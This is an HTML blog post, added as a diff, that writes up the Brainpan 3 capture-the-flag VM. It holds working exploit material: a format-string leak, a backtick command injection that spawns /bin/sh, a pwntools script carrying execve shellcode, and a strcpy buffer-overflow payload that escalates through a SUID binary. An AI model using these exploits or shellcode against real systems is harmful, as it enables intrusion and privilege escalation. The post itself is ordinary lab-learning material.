@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Brainpan: 3 - Part 1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-09-19">September 19, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/brainpan">brainpan</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Brainpan: 3 - Part 1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>As with the rest of the series, the focus of brainpan3 is on binary explotation.  The challenges in this VM are certainly a step-up in terms of difficultly compared to brainpan&rsquo;s 1 &amp; 2, and require you to bypass many common protection mechanisms.  On-and-off, it took me about 2 months to solve :s</p>
+
+<h2 id="port-scan:7a4f5a6448fafb319eff7e8a031bbd6b">Port Scan</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sT -p- -T5 192.168.56.105
+
+Not shown: 65533 filtered ports
+PORT     STATE  SERVICE
+1337/tcp open   waste
+8080/tcp closed http-proxy
+</code></pre>
+
+<h2 id="access-code:7a4f5a6448fafb319eff7e8a031bbd6b">Access Code</h2>
+
+<pre><code class="language-text">root@kali:~# nc 192.168.56.105 1337
+
+
+  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
+  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | 
+  |   |  __ &lt;    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | 
+ ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|
+
+                                                            by superkojiman
+
+
+
+
+AUTHORIZED PERSONNEL ONLY
+PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
+A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
+
+ACCESS CODE: 
+</code></pre>
+
+<p>If the code regenerates after 3 incorrect attempts, it&rsquo;s very unlikely we can bruteforce it.  With nothing else going for us, let&rsquo;s see what else we can shove in.</p>
+
+<p>You get a nice bit of ASCII art if you supply a large input.</p>
+
+<pre><code class="language-text">ACCESS CODE: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+
+
+                      /´¯/) 
+                    ,/¯  / 
+                   /    / 
+             /´¯/'   '/´¯¯`·¸ 
+          /'/   /    /       /¨¯\ 
+        ('(   ´   ´     ¯~/'   ') 
+         \                 '     / 
+          ''   \           _.·´ 
+            \              ( 
+              \__-_-____-___\   
+
+</code></pre>
+
+<p>If we try some format strings, we get a message that suggests we might be on the right track?</p>
+
+<pre><code class="language-text">ACCESS CODE: %x.%x.%x.%x
+ERROR #4: WHAT IS THIS, AMATEUR HOUR?
+</code></pre>
+
+<p>We find that <code>%p</code> works.</p>
+
+<pre><code class="language-text">ACCESS CODE: %p.%p.%p.%p.%p.%p
+ERROR #1: INVALID ACCESS CODE: 0xbfacf99c.(nil).0x1850.0xbfacf99c.(nil).0xa
+</code></pre>
+
+<p>Hopefully we can use this to find the access code on the stack.  After some searching, we determine that the code is in the third postition and we can use the decimal format to dump it out.</p>
+
+<pre><code class="language-text">ACCESS CODE: %3$d
+ERROR #1: INVALID ACCESS CODE: 6224
+
+ACCESS CODE: 6224
+
+--------------------------------------------------------------
+SESSION: ID-1300
+  AUTH   [Y]    REPORT [N]    MENU   [Y]  
+--------------------------------------------------------------
+
+
+1  - CREATE REPORT
+2  - VIEW CODE REPOSITORY
+3  - UPDATE SESSION NAME
+4  - SHELL
+5  - LOG OFF
+
+ENTER COMMAND: 
+</code></pre>
+
+<p><code>SHELL</code> is obviously a troll.</p>
+
+<pre><code class="language-text">ENTER COMMAND: 4
+SELECTED: 4
+reynard@brainpan3 $ ls
+total 0
+-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 let
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down
+</code></pre>
+
+<h2 id="session-name:7a4f5a6448fafb319eff7e8a031bbd6b">Session Name</h2>
+
+<p>We have this banner across the top.</p>
+
+<pre><code class="language-text">--------------------------------------------------------------
+SESSION: ID-1300
+  AUTH   [Y]    REPORT [N]    MENU   [Y]  
+--------------------------------------------------------------
+</code></pre>
+
+<p>It has a session name but we can see that the <code>report</code> function is disabled.  If we try and access it, we get told no :(</p>
+
+<pre><code class="language-text">ENTER COMMAND: 1
+SELECTED: 1
+REPORT MODE IS DISABLED IN THIS BUILD
+</code></pre>
+
+<pre><code class="language-text">ENTER COMMAND: 3
+SELECTED: 3
+ENTER NEW SESSION NAME: new session
+--------------------------------------------------------------
+SESSION: new session
+ �u
+  AUTH   [Y]    REPORT [N]    MENU   [Y]  
+--------------------------------------------------------------
+</code></pre>
+
+<p>When I modified the session name, I noticed some odd characters getting added underneath.  So I started mucking around with this input.  What I eventually found, was that I could overflow the values set here. See how <code>MENU [A]</code> is now set.</p>
+
+<pre><code class="language-text">ENTER NEW SESSION NAME: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+--------------------------------------------------------------
+SESSION: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+  AUTH   [Y]    REPORT [N]    MENU   [A]  
+--------------------------------------------------------------
+</code></pre>
+
+<p>The postition required to overflow <code>REPORT</code> is 253.</p>
+
+<pre><code class="language-text">ENTER COMMAND: 3
+SELECTED: 3
+ENTER NEW SESSION NAME: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
+--------------------------------------------------------------
+SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
+  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
+--------------------------------------------------------------
+</code></pre>
+
+<p>Now we can access the report area.</p>
+
+<pre><code class="language-text">ENTER COMMAND: 1
+SELECTED: 1
+
+ENTER REPORT, END WITH NEW LINE:
+
+this is a report
+
+REPORT [this is a report4]
+SENDING TO REPORT MODULE
+
+[+] WRITING REPORT TO /home/anansi/REPORTS/20150919124751.rep
+[+] DATA SUCCESSFULLY ENCRYPTED
+[+] DATA SUCCESSFULLY RECORDED
+[+] RECORDED [����҄�Ҍҟ������]
+</code></pre>
+
+<p>On first impressions, it seems our input gets encrypted and stored in <code>anansi's</code> home directory.  After some more experimenting I found that the input to report was vulnerable to a buffer overflow, since it was triggering the stack protection on the binary.</p>
+
+<pre><code class="language-text">ENTER REPORT, END WITH NEW LINE:
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+REPORT [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYYY]
+SENDING TO REPORT MODULE
+
+*** stack smashing detected ***: /var/www/repo/report terminated
+[+] WRITING REPORT TO /home/anansi/REPORTS/20150919124950.rep
+[+] DATA SUCCESSFULLY ENCRYPTED
+[+] DATA SUCCESSFULLY RECORDED
+[+] RECORDED [�������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]
+Aborted (core dumped)
+</code></pre>
+
+<p>It&rsquo;s at this point we have to take a step back, without the actual binary to analyse I couldn&rsquo;t see a way of progressing this further.</p>
+
+<h2 id="some-trolls:7a4f5a6448fafb319eff7e8a031bbd6b">Some Trolls</h2>
+
+<p>Option <code>2  - VIEW CODE REPOSITORY</code> opens up port <code>8080</code> that we saw closed earlier.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-3/hacked.png"  />
+    
+    
+</figure>
+</div>
+
+<p>The <code>robots</code> file containts <code>Disallow: /bp3_repo</code>&hellip; which is yet another troll.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-3/mario.gif"  />
+    
+    
+</figure>
+</div>
+
+<p>After <em>more</em> searching, we find a <code>repo</code> directory, with a simple listing.</p>
+
+<pre><code class="language-text">Directory listing for /repo/
+
+    bofh
+    how-to-pwn-brainpan.jpg
+    README.txt
+    report
+    shell 
+</code></pre>
+
+<p><code>bofh</code> and <code>shell</code> (my fav) both seem to be trolls.</p>
+
+<pre><code class="language-text">root@kali:~# ./shell 
+            ___
+        .-&quot;; ! ;&quot;-.
+      .'!  : | :  !`.
+     /\  ! : ! : !  /\
+    /\ |  ! :|: !  | /\
+   (  \ \ ; :!: ; / /  )
+  ( `. \ | !:|:! | / .' )
+  (`. \ \ \!:|:!/ / / .')
+   \ `.`.\ |!|! |/,'.' /
+    `._`.\\\!!!// .'_.'
+       `.`.\\|//.'.'
+        |`._`n'_.'|
+        &quot;----^----&quot;
+
+     here's your shell
+</code></pre>
+
+<h2 id="report:7a4f5a6448fafb319eff7e8a031bbd6b">Report</h2>
+
+<p>The <code>report</code> binary is really where we need to focus our effort.</p>
+
+<pre><code class="language-text">root@kali:~/bp3# file report 
+report: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ba63c3cd3047efba60ab9d506bd5d954492c4660, not stripped
+
+root@kali:~/bp3# ./report 
+./report &lt;report&gt; [0|1]
+</code></pre>
+
+<p>It doesn&rsquo;t matter which option you choose (0 or 1), you get the same result.</p>
+
+<pre><code class="language-text">               ____
+           .-'&amp;    '-.
+          / __    __  \
+         :-(__)--(__)--;
+        (      (_       )
+         :             ;
+          \    __     /
+           `-._____.-'
+             /`&quot;&quot;&quot;`\
+            /    ,  \
+           /|/\/\/\ _\
+          (_|/\/\/\\__)
+            |_______|
+           __)_ |_ (__
+          (_____|_____)
+
+       YOU'RE IN THE MATRIX
+           CHARLIE BROWN
+</code></pre>
+
+<p>At some point, superkoijman showed me that this was from The Simpsons :)</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-3/matrix.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>Let&rsquo;s get into the binary.</p>
+
+<pre><code class="language-text">gdb-peda$ checksec 
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre>
+
+<p>If we disassemble a function called <code>cb</code>, we spot a call to <code>uname</code>.</p>
+
+<pre><code class="language-text">gdb-peda$ pdisass cb
+   0x08048b44 &lt;+32&gt;:	call   0x8048640 &lt;uname@plt&gt;
+   0x08048b49 &lt;+37&gt;:	mov    DWORD PTR [esp+0x4],0x8048e98
+
+gdb-peda$ x/s 0x8048e98
+0x8048e98:	&quot;brainpan3&quot;
+</code></pre>
+
+<p>So the hostname of the machine has to be <code>brainpan3</code> before it&rsquo;ll go any further.  I&rsquo;m sure you could just NOP it out in gdb, or just change the hostname of your machine.  With that now working, I ran the binary twice.</p>
+
+<h2 id="bof-ing:7a4f5a6448fafb319eff7e8a031bbd6b">BoF&rsquo;ing</h2>
+
+<pre><code class="language-text">root@brainpan3:~/bp3# ./report test 1
+[+] WRITING REPORT TO /home/anansi/REPORTS/20150919213852.rep
+[+] DATA SUCCESSFULLY ENCRYPTED
+[+] DATA SUCCESSFULLY RECORDED
+[+] RECORDED [����]
+
+root@brainpan3:~/bp3# ./report test 0
+[+] WRITING REPORT TO /home/anansi/REPORTS/20150919213854.rep
+[+] DATA SUCCESSFULLY ENCRYPTED
+[+] DATA SUCCESSFULLY RECORDED
+Segmentation fault
+</code></pre>
+
+<p>Obviously the SEGFAULT is interesting, so let&rsquo;s run that again in gdb.</p>
+
+<pre><code class="language-text">gdb-peda$ r test 0
+
+Stopped reason: SIGSEGV
+0x08040074 in ?? ()
+</code></pre>
+
+<p>You will notice that <code>74</code> is <code>t</code>.  Putting in a slightly longer input, we find that we can controll EIP after just 3 bytes.</p>
+
+<pre><code class="language-text">gdb-peda$ r AAABBBB 0
+
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+</code></pre>
+
+<p>But where is the stack smashing message we saw earlier?  Turns out this only happens when you run the binary with <code>1</code>.</p>
+
+<pre><code class="language-text">root@brainpan3:~/bp3# ./report AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 1
+[+] WRITING REPORT TO /home/anansi/REPORTS/20150919214423.rep
+[+] DATA SUCCESSFULLY ENCRYPTED
+[+] DATA SUCCESSFULLY RECORDED
+[+] RECORDED [��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]
+*** stack smashing detected ***: ./report terminated
+Segmentation fault
+</code></pre>
+
+<p>So the way we are interacting with the binary over netcat, it is automatically run as <code>1</code> rather than <code>0</code>.  I went back to netcat to see if I could solve this problem before proceeding.  After some expermenting, I found that you could prematurely terminate the command being run.</p>
+
+<pre><code class="language-text">ENTER REPORT, END WITH NEW LINE:
+
+&quot;      
+
+REPORT [&quot;]
+SENDING TO REPORT MODULE
+
+sh: 1: Syntax error: Unterminated quoted string
+</code></pre>
+
+<pre><code class="language-text">ENTER REPORT, END WITH NEW LINE:
+
+AAABBBB&quot; 0&quot;
+
+REPORT [AAABBBB&quot; 0&quot;]
+SENDING TO REPORT MODULE
+
+Segmentation fault (core dumped)
+</code></pre>
+
+<p>It was around this point I discovered an easier way in.</p>
+
+<pre><code class="language-text">ENTER REPORT, END WITH NEW LINE:
+
+`/bin/sh &gt;&amp;2`
+
+REPORT [`/bin/sh &gt;&amp;2`]
+SENDING TO REPORT MODULE
+
+id
+uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
+</code></pre>
+
+<p>I wasn&rsquo;t satisifed with getting through this way, so I carried on trying to solve the binary &lsquo;properly&rsquo;.</p>
+
+<p>So after much disassembling, we find that we overwrite a pointer for <code>REPORT</code> with our buffer.  If we break at <code>main</code> and dump the area of memory, there is nothing there.  After our input gets written, we can see it on the stack.</p>
+
+<pre><code class="language-text">gdb-peda$ b main
+gdb-peda$ r AAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC 0
+
+gdb-peda$ x/12wx 0x804b0a0
+0x804b0a0 &lt;REPORT&gt;:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b0b0 &lt;REPORT+16&gt;:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b0c0 &lt;REPORT+32&gt;:	0x00000000	0x00000000	0x00000000	0x00000000
+
+gdb-peda$ c
+
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+
+gdb-peda$ x/12wx 0x804b0a0
+0x804b0a0 &lt;REPORT&gt;:	0x42414141	0x43424242	0x43434343	0x43434343
+0x804b0b0 &lt;REPORT+16&gt;:	0x43434343	0x43434343	0x43434343	0x43434343
+0x804b0c0 &lt;REPORT+32&gt;:	0x43434343	0x43434343	0x43434343	0x43434343
+</code></pre>
+
+<p>The last bit of the puzzle is bypassing the <code>NX</code> protection.  Actually&hellip; we don&rsquo;t need to, as superkojiman already does this for us.  There is a call to <code>mprotect</code> in <code>main</code> - I leave it as an exercise to the reader to verify, but it basically makes the <code>REPORT</code> region of memory <code>rwx</code>.</p>
+
+<p>Now we&rsquo;ve overwritten the pointer, we have to make a relative jump foward into our shellcode - truth be told, I couldn&rsquo;t be bothered to work out by how much.  So I slapped a <code>+10</code> in and placed a handful of <code>NOPs</code>.</p>
+
+<p>Testing this approach using a SIGTRAP.</p>
+
+<pre><code class="language-text">gdb-peda$ r $(python -c ' print &quot;AAA&quot; + &quot;\xb0\xb0\x04\x08&quot; + &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; + &quot;\xcc\xcc&quot;') 0
+
+Stopped reason: SIGTRAP
+0x0804b0b2 in REPORT ()
+</code></pre>
+
+<p>Now to put it all together.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+from pwn import *
+import struct, re
+
+r = remote(&quot;192.168.56.102&quot;, 1337)
+
+r.recvuntil(&quot;CODE:&quot;)
+r.send(&quot;%3$d\n&quot;)
+recv = r.recvuntil(&quot;DIGITS&quot;)
+
+pin = re.findall(r&quot;INVALID ACCESS CODE: (.*?)\n&quot;, recv)[0]
+print &quot;Found Access Code: &quot; + pin
+
+r.send(pin + &quot;\n&quot;)
+r.recvuntil(&quot;COMMAND:&quot;)
+
+print &quot;Changing Session ID&quot;
+
+session = &quot;Y&quot; * 253
+r.send(&quot;3\n&quot;)
+r.recvuntil(&quot;NAME:&quot;)
+r.send(session + &quot;\n&quot;)
+r.recvuntil(&quot;COMMAND:&quot;)
+
+print &quot;Creating Report&quot;
+
+rep = &quot;AAA&quot;
+rep += p32(0x804b0a0 + 10)
+rep += &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;
+rep += '&quot; 0&quot;'
+
+r.send(&quot;1\n&quot;)
+r.send(rep + &quot;\n&quot;)
+
+print &quot;Dropping into shell&quot;
+
+r.interactive()
+</code></pre>
+
+<pre><code class="language-text">root@kali:~/bp3# ./report.py 
+[+] Opening connection to 192.168.56.105 on port 1337: Done
+Found Access Code: 2144
+Changing Session ID
+Creating Report
+Dropping into shell
+[*] Switching to interactive mode
+ SELECTED: 1
+
+ENTER REPORT, END WITH NEW LINE:
+
+
+REPORT [AAA\xaa\xb0\x0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901����
+                                                                   Qh//shh/bin\x89�̀&quot; 0&quot;\x16]
+SENDING TO REPORT MODULE
+
+$ id
+uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
+</code></pre>
+
+<h2 id="reynard:7a4f5a6448fafb319eff7e8a031bbd6b">Reynard</h2>
+
+<pre><code class="language-text">$ ls -l /home/reynard/private
+total 16
+-rwsr-xr-x 1 reynard reynard 5568 May 19 18:28 cryptor
+-r-------- 1 reynard reynard   77 May 21 10:42 sekret.txt.enc
+</code></pre>
+
+<p>Here we have a SUID binary owned by <code>reynard</code>.  It&rsquo;s difficult to get files in and out of brainpan3, as there seem to be really strict firewall rules in place.  So to transfer it to my machine for analysis, I used <code>xxd</code> and copied the output in the Terminal.</p>
+
+<p>The binary doesn&rsquo;t appear to do very much, unless I&rsquo;m not using it properly&hellip;</p>
+
+<pre><code class="language-text">root@kali:~/bp3# ./cryptor
+Usage: ./cryptor file key
+root@kali:~/bp3# echo test&gt;test
+root@kali:~/bp3# ./cryptor test qwerty
+[+] saving to test.enc
+root@kali:~/bp3# cat test.enc 
+test
+</code></pre>
+
+<p>It&rsquo;s a stripped binary, but doesn&rsquo;t have much in the way of protections.</p>
+
+<pre><code class="language-text">root@kali:~/bp3# file cryptor
+cryptor: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9b8ec7935e7b95d1897867969c43303940c4407e, stripped
+
+gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : Partial
+</code></pre>
+
+<p>Simply running <code>strings</code> reveals that <code>strcpy</code> is in use somewhere.  I actually disassembled the binary in a trial version of Hopper - and we can see that it does a string length check on the input arguments.  This is the Hopper pseudo-code:</p>
+
+<pre><code class="language-c">    if (strlen(arg0) &gt; 0x74) {
+            strncpy(var_78, arg0, 0x5a);
+    }
+    else {
+            strcpy(var_78, arg0);
+    }
+</code></pre>
+
+<p>So if we supply an input for <code>argv0</code> of 116 bytes, it will get passed to <code>strcpy</code> rather than <code>strncpy</code>.</p>
+
+<pre><code class="language-text">gdb-peda$ r $(python -c 'print &quot;A&quot; * 116') qwerty
+
+EAX: 0x0 
+EBX: 0x41414141 ('AAAA')
+ECX: 0x0 
+EDX: 0x0 
+ESI: 0x0 
+EDI: 0x636e652e ('.enc')
+EBP: 0x1 
+ESP: 0xbffff308 --&gt; 0xb7e14a68 --&gt; 0x1df7 
+EIP: 0xb7fb57e0 --&gt; 0x0
+
+Stopped reason: SIGSEGV
+0xb7fb57e0 in _IO_wfile_jumps () from /lib/i386-linux-gnu/i686/cmov/libc.so.6
+</code></pre>
+
+<p>That&rsquo;s a start, but we don&rsquo;t yet control EIP.  I tried it again, but with a longer key.</p>
+
+<pre><code class="language-text">gdb-peda$ r $(python -c 'print &quot;A&quot; * 116 + &quot; &quot; + &quot;B&quot; * 100')
+
+EAX: 0x0 
+EBX: 0x41414141 ('AAAA')
+ECX: 0x0 
+EDX: 0x0 
+ESI: 0x0 
+EDI: 0x636e652e ('.enc')
+EBP: 0x41414141 ('AAAA')
+ESP: 0xbffff308 ('A' &lt;repeats 100 times&gt;)
+EIP: 0x41414141 ('AAAA')
+
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+</code></pre>
+
+<p>Much more promising!  By using pattern create/offset I found that EIP gets overwritten after only 4 bytes, but the total string length still has to be 116 to trigger the overwrite.  Let&rsquo;s target EIP specifically.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+import struct
+
+buf = &quot;AAAA&quot;            # first junk
+buf += &quot;BBBB&quot;           # eip
+buf += &quot;C&quot; * (116-8)    # padding to reach 116
+buf += &quot; &quot;
+buf += &quot;D&quot; * 100        # key
+
+print buf
+</code></pre>
+
+<pre><code class="language-text">gdb-peda$ r $(./cryptor.py)
+
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+</code></pre>
+
+<p>Question now, is where to jump to?  Well it turns out that the data for &lsquo;key&rsquo; is always stored in the same place in memory.  Something we can verify in gdb just by searching for our input.</p>
+
+<pre><code class="language-text">gdb-peda$ find 'DDDD'
+Searching for 'DDDD' in: None ranges
+Found 50 results, display max 50 items:
+cryptor : 0x804a080 ('D' &lt;repeats 100 times&gt;)
+</code></pre>
+
+<p>No matter how many times you re-run the binary, the data is always located at <code>0x804a080</code>.  This means we can place shellcode here and jump to it quite reliably - something which I again tested with SIGTRAPs.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+import struct
+
+def p(x):
+        return struct.pack('&lt;L', x)
+
+buf = &quot;AAAA&quot;            # first junk
+buf += p(0x804a080)     # eip
+buf += &quot;C&quot; * (116-8)    # padding to reach 116
+buf += &quot; &quot;
+buf += &quot;\xcc&quot; * 100     # key
+
+print buf
+</code></pre>
+
+<pre><code class="language-text">Stopped reason: SIGTRAP
+0x0804a081 in ?? ()
+</code></pre>
+
+<p>Now smash some shellcode in.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+import struct
+
+def p(x):
+        return struct.pack('&lt;L', x)
+
+buf = &quot;AAAA&quot;           # padding
+buf += p(0x804a080)     # key always stored here
+buf += &quot;C&quot; * 108        # junk to reach 116
+buf += &quot; &quot;
+buf += &quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;
+
+print buf
+</code></pre>
+
+<p>I copied it across to brainpan3 using <code>xxd</code> and ran it.  It can take a few attempts for it to work.</p>
+
+<pre><code class="language-text">$ ./cryptor $(./cryptor.py)
+Segmentation fault (core dumped)
+$ ./cryptor $(./cryptor.py)
+$ id
+uid=1000(anansi) gid=1003(webdav) euid=1002(reynard) groups=1002(reynard)
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
